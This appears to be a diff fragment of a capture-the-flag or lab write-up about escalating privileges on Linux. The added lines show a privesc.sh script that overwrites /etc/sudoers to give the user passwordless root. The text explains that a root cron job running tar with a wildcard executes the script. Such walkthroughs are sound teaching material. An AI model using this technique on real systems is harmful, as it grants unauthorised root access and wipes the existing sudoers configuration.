@@ -33,6 +33,12 @@ user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ nano privesc.sh
 user@af8b3519640a4f0bbb4854165e974ee7-2377118072:~/dropbox$ chmod +x privesc.sh 
 ```
 
+> Inside privesc.sh:
+>
+
+```bash
+echo 'user ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+```
 
 Once the cron job triggers its minutely cycle, the wildcard expands to include our flags. tar executes privesc.sh with root permissions, shifting our privilege boundaries. Checking sudo -l confirms our updated execution rights:
 
